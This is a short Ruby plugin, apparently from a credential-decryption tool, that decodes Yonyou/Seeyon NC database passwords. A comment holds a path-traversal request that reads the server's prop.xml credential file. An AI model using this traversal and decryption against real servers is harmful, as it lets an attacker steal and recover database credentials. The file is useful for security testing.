#!/usr/bin/env ruby
#
# Plugin seeyon_nc database decrypt
# Author L
#
# /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
#

if Kernel.const_defined? :Rjb

plugin 'seeyon_nc' do 
  supported_algorithm :seeyon_nc

  crack {
    plain = Rjb.import('Main').decode(passwd)
    plain if plain.printable?
  }
end

end
